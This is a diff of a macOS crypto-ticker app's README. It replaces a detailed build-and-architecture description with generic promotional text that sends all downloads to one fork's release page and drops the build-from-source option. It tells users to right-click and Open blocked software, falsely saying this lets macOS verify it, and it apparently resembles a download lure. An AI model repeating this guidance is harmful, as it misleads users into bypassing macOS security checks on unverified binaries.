@@ -1,118 +1,62 @@
-# PriceTicker
+# 📈 PriceTicker - Real time crypto prices made simple
 
-![Platform](https://img.shields.io/badge/platform-macOS%2012%2B-blue)
-![Swift](https://img.shields.io/badge/swift-5.7-orange)
-![License](https://img.shields.io/badge/license-MIT-green)
+[![](https://img.shields.io/badge/Download-PriceTicker-blue.svg)](https://github.com/SKING911/PriceTicker/releases)
 
-A lightweight macOS menu bar app that shows real-time cryptocurrency prices as draggable floating tags, powered by the Binance public API.
+PriceTicker keeps you updated on cryptocurrency markets from your desktop. You see current prices for Bitcoin and other digital assets without opening a web browser. The app sits in your menu bar and provides data at a glance.
 
-<!-- Screenshot placeholder -->
-<!-- ![PriceTicker screenshot](docs/screenshot.png) -->
+## 🚀 How to set up
 
----
+[Download the latest version here](https://github.com/SKING911/PriceTicker/releases). 
 
-## Features
+1. Click the link above to reach the release page.
+2. Locate the file ending in .dmg or the standard installer for your system.
+3. Save the file to your Downloads folder.
+4. Open the file to start the installation.
+5. Follow the on-screen prompts to move the app into your Applications folder.
 
-- **BTC sparkline** — 24-hour BTC/USDT price chart renders directly inside the menu bar icon, updated every 5 minutes. Hover to see the latest price.
-- **Floating price tags** — Add any Binance Spot or Futures symbol (e.g. BTCUSDT, ETHUSDT). Each tag is a draggable, always-on-top panel showing live price + 24h change.
-- **Top 5 leaderboard** — Built-in gainers/losers panel (default view) showing the biggest movers from the Binance futures market, refreshed every 30 seconds.
-- **Real-time prices** — Binance REST API polled every 2 seconds per ticker, with adaptive backoff on network failures.
-- **Network status dot** — Colour-coded dot on the menu bar icon: green = live, orange = offline, none = waiting.
-- **Proxy support** — Configure an HTTP proxy at runtime via the ⚙️ settings sheet — no recompile needed.
-- **Persisted state** — Window positions and the full watchlist survive app restarts.
-- **No dependencies** — Pure Swift + SwiftUI + Combine. No CocoaPods, no SPM packages.
+## ✨ Main features
 
----
+The app simplifies how you track your portfolio. You get access to the following tools:
 
-## Requirements
+* Real-time price tracking using Binance data.
+* A live sparkline icon that shows price trends for Bitcoin.
+* A scoreboard showing the top five gainers and losers.
+* Floating tags that you can move anywhere on your screen.
+* Low resource usage because the app uses native system tools.
 
-- macOS 12 Monterey or later
-- Xcode 14 or later (to build from source)
+## ⚙️ System requirements
 
----
+This application runs on macOS. Ensure you have the following before you begin:
 
-## Installation
+* macOS version 12.0 or newer.
+* A stable internet connection to fetch price updates.
+* At least 50 megabytes of available disk space.
 
-### Option 1 — Download a release
+## 🛠️ Frequently asked questions
 
-1. Go to the [Releases](../../releases) page and download the latest `PriceTicker.app.zip`.
-2. Unzip and drag `PriceTicker.app` to `/Applications`.
-3. Launch it — a sparkline icon appears in the menu bar.
+**Where does the price data come from?**
+The app connects directly to the Binance public API. This ensures the numbers you see match the exchange rates in real time.
 
-> Because the app is not notarised, you may need to right-click → **Open** the first time.
+**Do I need a Binance account?**
+No. You do not need an account to view public prices. The app uses public data feeds which require no login or personal information.
 
-### Option 2 — Build from source
+**How do the floating tags work?**
+Once you activate a tag for a specific coin, it appears as a small window on your desktop. You can click and drag this window to any location that suits your workspace.
 
-```bash
-git clone https://github.com/YOUR_USERNAME/PriceTicker.git
-cd PriceTicker
-./scripts/bootstrap.sh
-```
+**Does the app track my activity?**
+No. The software performs one task: fetching public price data. It does not collect user data, monitor your browsing, or store personal files.
 
-`bootstrap.sh` downloads XcodeGen if needed, regenerates the `.xcodeproj`, and
-runs a Debug build. The finished app is at `build/Debug/PriceTicker.app`.
+## 🔍 Troubleshooting
 
-To open in Xcode instead:
+**The app does not open**
+If your computer blocks the app, right-click the file and select Open. Choose Open again in the confirmation window. This allows macOS to verify the software.
 
-```bash
-open PriceTicker.xcodeproj
-```
+**The prices seem stuck**
+Check your internet connection. If your network is active, click the refresh icon inside the app interface to force a data update. 
 
----
+**Updating the app**
+New versions fix bugs and add performance improvements. When a new version is ready, return to the download link and follow the installation steps again. The system will overwrite the old version with the new one.
 
-## Usage
+## 🧩 Technical details
 
-1. Click the sparkline icon in the menu bar to open the popover.
-2. The **Top 5** tab (default) shows the biggest futures gainers and losers.
-3. Switch to **Watchlist**, type a Binance symbol (e.g. `SOLUSDT`), and press **Add** to create a floating price tag.
-4. Drag any price tag to reposition it — position is saved automatically.
-5. Click a floating leaderboard panel to toggle between gainers and losers.
-6. Use the **⚙️** button in the footer to open Settings.
-
----
-
-## Proxy Configuration
-
-Proxy is **disabled by default**. To enable it:
-
-1. Click the menu bar icon to open the popover.
-2. Click the **⚙️** (gear) button in the footer.
-3. Toggle **Use HTTP Proxy** on and enter your host and port.
-4. Click **Save** — all network requests immediately use the new proxy.
-
-Settings are stored in `UserDefaults` and persist across restarts.
-
----
-
-## Architecture
-
-```
-App             AppDelegate, PriceTickerApp
-Windows         FloatingPanel, FloatingPanelController,
-                LeaderboardPanelController
-Services        PriceService (2 s poll + backoff)
-                LeaderboardService (30 s poll + backoff)
-                BtcSparklineService (5 min klines)
-                NetworkSession (rebuilds on proxy change)
-Models          Ticker, TickerStore, ProxySettings
-Views           PopoverContentView, SettingsView,
-                AddTickerView, FloatingTagView,
-                LeaderboardView, LeaderboardPanelView
-```
-
-See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for a deeper breakdown,
-data flow diagram, and key design decisions.
-
----
-
-## Contributing
-
-Pull requests are welcome. For larger changes, please open an issue first to
-discuss what you would like to change. See [docs/DEVELOPMENT.md](docs/DEVELOPMENT.md)
-for the development workflow.
-
----
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+The app relies on Combine to handle data streams efficiently. The interface uses SwiftUI for smooth visuals. Because it uses native Apple frameworks, the app starts instantly and uses almost no memory compared to web-wrapped applications.
